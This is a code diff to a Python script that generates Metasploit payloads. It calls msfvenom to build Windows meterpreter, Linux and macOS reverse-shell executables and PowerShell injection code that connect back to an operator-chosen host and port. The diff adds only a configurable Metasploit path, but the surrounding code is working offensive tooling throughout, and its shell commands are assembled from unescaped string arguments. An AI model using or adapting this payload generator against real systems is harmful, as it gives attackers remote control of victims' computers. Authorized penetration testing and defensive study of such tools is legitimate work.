@@ -11,6 +11,11 @@ import sys
 import re
 import getopt
 
+#Hardcoding for metasploit absolute path.
+msfpath = ''
+if len(msfpath) > 1 and msfpath[len(msfpath)-1] != "/":
+	msfpath += "/"
+
 WINDOWS_DEFAULT = 'windows/meterpreter/reverse_tcp'
 LINUX_DEFAULT = 'linux/x86/meterpreter/reverse_tcp'
 OSX_DEFAULT = 'osx/x86/shell_reverse_tcp'
@@ -94,8 +99,8 @@ def shellcode_replace(ipaddr, port, shellcode):
 def generate_shellcode(payload, ipaddr, port):
     port = port.replace("LPORT=", "")
     with open(os.devnull, 'w') as devnull:
-        proc = subprocess.Popen("msfvenom -p %s LHOST=%s LPORT=%s StagerURILength=5 StagerVerifySSLCert=false -a x86 --platform windows --smallest -f c" %
-             (payload, ipaddr, port), stdout=subprocess.PIPE, stderr=devnull, shell=True)
+        proc = subprocess.Popen("%smsfvenom -p %s LHOST=%s LPORT=%s StagerURILength=5 StagerVerifySSLCert=false -a x86 --platform windows --smallest -f c" %
+             (msfpath, payload, ipaddr, port), stdout=subprocess.PIPE, stderr=devnull, shell=True)
     data, err = proc.communicate()
     data = data.decode('ascii')
     repls = [';', ' ', '+', '"', '\n', 'unsigned char buf=',
@@ -223,11 +228,11 @@ if __name__ == '__main__':
       osx = arg
 
   print 'Generating Windows payload: {payload}...'.format(payload=windows)
-  os.system('msfvenom -p {payload} -f exe LHOST={ip} LPORT={port} > {output} 2> /dev/null'.format(payload=windows, ip=ip_address, port=WINDOWS_PORT, output=os.path.join('output', 'msf.exe')))
+  os.system('{msfp}msfvenom -p {payload} -f exe LHOST={ip} LPORT={port} > {output} 2> /dev/null'.format(msfp=msfpath, payload=windows, ip=ip_address, port=WINDOWS_PORT, output=os.path.join('output', 'msf.exe')))
   print 'Generating Linux payload: {payload}...'.format(payload=linux)
-  os.system('msfvenom -p {payload} -f elf LHOST={ip} LPORT={port} > {output} 2> /dev/null'.format(payload=linux, ip=ip_address, port=LINUX_PORT, output=os.path.join('output', 'nix.bin')))
+  os.system('{msfp}msfvenom -p {payload} -f elf LHOST={ip} LPORT={port} > {output} 2> /dev/null'.format(msfp=msfpath, payload=linux, ip=ip_address, port=LINUX_PORT, output=os.path.join('output', 'nix.bin')))
   print 'Generating Mac OS X payload: {payload}...'.format(payload=osx)
-  os.system('msfvenom -p {payload} -f elf LHOST={ip} LPORT={port} > {output} 2> /dev/null'.format(payload=osx, ip=ip_address, port=OSX_PORT, output=os.path.join('output', 'mac.bin')))
+  os.system('{msfp}msfvenom -p {payload} -f elf LHOST={ip} LPORT={port} > {output} 2> /dev/null'.format(msfp=msfpath, payload=osx, ip=ip_address, port=OSX_PORT, output=os.path.join('output', 'mac.bin')))
   print "Generating x86-based powershell injection code..."
   x86 = str(generate_powershell_alphanumeric_payload(windows, ip_address, str(WINDOWS_PORT), ''))
 
